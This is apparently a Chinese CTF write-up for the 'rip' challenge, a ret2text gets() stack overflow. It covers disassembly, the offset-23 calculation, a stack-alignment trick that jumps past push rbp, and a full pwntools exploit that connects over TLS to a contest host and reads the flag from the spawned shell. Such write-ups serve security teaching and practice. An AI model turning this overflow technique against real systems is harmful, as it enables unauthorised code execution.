# Speedrun：rip

> 题型：ret2text / 64 位 `gets` 栈溢出  
> 目标：跳到隐藏函数 `fun`，执行 `system("/bin/sh")`  
> 关键：偏移 **23**，返回地址 **0x401187**

---

## 0. 一句话结论

```text
main 里 gets(buf) 的 buf 在 rbp-0xf
  → 偏移 = 0xf + 8 = 23
  → fun@0x401186 内部调用 system("/bin/sh")
  → 但直接跳 0x401186 会因 push rbp 破坏栈对齐
  → 实际跳 0x401187（跳过 push rbp）
```

Payload：

```python
b'A' * 23 + p64(0x401187)
```

---

## 1. 30 秒定性质

```bash
cd '/home/yfhd5/Pwn Writeups/ret2text'

file rip
checksec --file=rip
nm -n rip | grep -E ' (main|fun)$'
objdump -d -M intel rip | sed -n '/<main>:/,/^$/p'
objdump -d -M intel rip | sed -n '/<fun>:/,/^$/p'
objdump -s -j .rodata rip
```

关键输出：

```text
ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped
No canary found
No PIE (0x400000)
NX unknown - GNU_STACK missing
Stack: Executable
RWX: Has RWX segments

0000000000401142 T main
0000000000401186 T fun

402000 01000200 706c6561 73652069 6e707574  ....please input
402010 006f6b2c 62796521 2121002f 62696e2f  .ok,bye!!!./bin/
402020 736800                               sh.
```

读法：

| 观察 | 结论 |
| --- | --- |
| Not stripped + `nm` 看到 `fun` | 后门直接暴露 |
| No PIE | 地址可硬编码 |
| No canary | 可覆盖 saved RIP |
| `fun` 里有 `system@plt` | 目标是拿 shell |
| `0x40201b` 是 `/bin/sh` | `fun` 的参数已准备好 |

---

## 2. 关键逆向

### 2.1 `main`：漏洞点

```asm
0000000000401142 <main>:
  401142: push   rbp
  401143: mov    rbp,rsp
  401146: sub    rsp,0x10
  40114a: lea    rdi,[rip+0xeb3]        # 402004 "please input"
  401151: call   401030 <puts@plt>
  401156: lea    rax,[rbp-0xf]          ; buf = rbp - 0xf
  40115a: mov    rdi,rax
  40115d: mov    eax,0x0
  401162: call   401050 <gets@plt>      ; 无边界检查
  401167: lea    rax,[rbp-0xf]
  40116b: mov    rdi,rax
  40116e: call   401030 <puts@plt>
  401173: lea    rdi,[rip+0xe97]        # 402011 "ok,bye!!!"
  40117a: call   401030 <puts@plt>
  40117f: mov    eax,0x0
  401184: leave
  401185: ret
```

栈布局：

```text
rbp-0x0f .. rbp-0x01 : buf[15]
rbp+0x00 .. rbp+0x07 : saved rbp
rbp+0x08 .. rbp+0x0f : saved RIP
```

所以：

```text
offset = 0xf + 8 = 23
```

### 2.2 `fun`：后门

```asm
0000000000401186 <fun>:
  401186: push   rbp
  401187: mov    rbp,rsp
  40118a: lea    rdi,[rip+0xe8a]        # 40201b "/bin/sh"
  401191: call   401040 <system@plt>
  401196: nop
  401197: pop    rbp
  401198: ret
```

等价 C：

```c
void fun(void) {
    system("/bin/sh");
}
```

不需要传参，也不需要 leak。

---

## 3. 两个致命细节

### 3.1 偏移必须是 23，不是 24

`saved RIP` 从 offset **23** 开始：

```text
offset 0..14  : buf
offset 15..22 : saved rbp
offset 23..30 : saved RIP
```

如果填 24 字节再接地址，地址会从 `saved RIP + 1` 开始写，RIP 被拼成错误值，直接崩。

### 3.2 目标必须是 `0x401187`，不是 `0x401186`

跳到 `0x401186` 会先执行：

```asm
push rbp
```

这会破坏 `system()` 要求的 16 字节栈对齐，典型表现是 `movaps` 崩溃（SIGSEGV）。

跳到 `0x401187`：

```asm
mov rbp,rsp
lea rdi,[rip+...]   ; "/bin/sh"
call system@plt
```

跳过 `push rbp`，栈对齐正确。

本地实测：

| padding | target | 结果 |
| --- | --- | --- |
| 23 | `0x401187` | 成功拿到 shell，输出 `SHELL_OK` |
| 23 | `0x401186` | SIGSEGV |
| 24 | `0x401187` | SIGSEGV |

---

## 4. Payload 布局

```text
[ 23 字节 'A' ][ p64(0x401187) ]
```

```python
from pwn import *

payload = b'A' * 23 + p64(0x401187)
```

总长度：

```text
23 + 8 = 31 字节
```

`gets` 会在末尾补 `\x00`，落在 saved RIP 之后，不影响返回地址。

---

## 5. 完整 exp

```python
from pwn import *
import ssl, re, time

context.arch = "amd64"
context.log_level = "info"

HOST = "8775b11652ba4e9f26e7daa4.tcp-ctf2.dasctf.com"
PORT = 9999

def exploit():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    p = remote(HOST, PORT, ssl=True, ssl_context=ctx, sni=HOST)

    payload = b"A" * 23 + p64(0x401187)
    p.sendline(payload)

    # gets 可能预读，等 shell 起来后再发命令
    time.sleep(0.3)
    p.sendline(b"cat flag* 2>/dev/null; cat /flag* 2>/dev/null; exit")

    out = p.recvall(timeout=10).decode("utf-8", errors="ignore")
    print(out)

    flags = re.findall(r"(?:CTF2|flag|DASCTF)\{[^}]+\}", out)
    if flags:
        print(f"[🎉] GOT THE FLAG: {flags[0]}")
    else:
        print("[-] Flag not found, raw output above")

if __name__ == "__main__":
    exploit()
```

如果想手动操作：

```python
p.sendline(b"A" * 23 + p64(0x401187))
p.interactive()
```

---

## 6. 交互坑

1. **`gets` 可能预读**
   如果 payload 和 `cat flag` 一次性发，`gets` 的 stdio 缓冲区可能把后面的命令也读走，shell 收不到命令而卡住。  
   解决：payload 发完后 `sleep(0.3)`，再发命令；或者直接 `p.interactive()`。

2. **shell 退出后程序会崩**
   `fun` 的 `ret` 返回到栈上的垃圾地址，shell `exit` 后进程 SIGSEGV 是正常的。  
   只要 flag 已经输出，不用管退出码。

3. **TLS**
   CTF² 需要 `ssl=True`；普通 `remote` 可能握手失败。

4. **不要跳到 `0x401186`**
   栈对齐崩溃，不是偏移错。

5. **不要用 24 字节 padding**
   地址错位，RIP 会变成不可控值。

6. **`/bin/sh` 不需要额外参数**
   `fun` 自己会把 `rdi` 设为 `/bin/sh`。

---

## 7. 2 分钟速通时间线

| 时间 | 动作 |
| --- | --- |
| 0:00–0:20 | `file` + `checksec` + `nm`：发现 `fun` |
| 0:20–0:45 | `objdump main/fun`：拿到 offset 23、`/bin/sh`、`0x401186` |
| 0:45–1:05 | 写 payload：`23 + p64(0x401187)` |
| 1:05–1:25 | 本地验证：23/0x401187 成功，其余崩溃 |
| 1:25–1:45 | 远程 TLS 打过去，sleep 后发 `cat flag*` |

---

## 8. 题型识别卡

```text
Not stripped + nm 看到 fun
+ gets(buf) 且 buf 在 rbp-0xf
+ fun 内 system("/bin/sh")
+ No PIE
= ret2text，offset 23，target 0x401187
```

一句话：**`23` 不是 `24`，`0x401187` 不是 `0x401186`，剩下就是 `cat flag`。**
